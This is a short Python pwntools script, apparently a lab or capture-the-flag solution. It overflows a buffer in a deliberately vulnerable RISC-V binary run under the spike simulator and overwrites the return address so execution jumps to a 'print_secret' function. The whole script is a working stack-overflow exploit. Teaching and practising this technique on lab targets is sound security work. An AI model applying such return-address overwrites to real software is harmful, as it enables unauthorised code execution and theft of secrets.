#!/usr/bin/env python

from pwn import *

cmd = 'bin/spike build/riscv-pk/pk sw/bof'
p = process(argv=cmd.split())
e = ELF('./sw/bof')

get_a_shell = e.symbols['print_secret']


buf = bytes("1"*120 + "ABCDEFGH" + "BBBBCCCC", 'utf-8') + p64(get_a_shell)
print(buf)
out = p.recv().decode('utf-8')
print(out)
p.sendline(buf)

try:
    out = p.recv().decode('utf-8')
    print(out)
except EOFError:
    pass
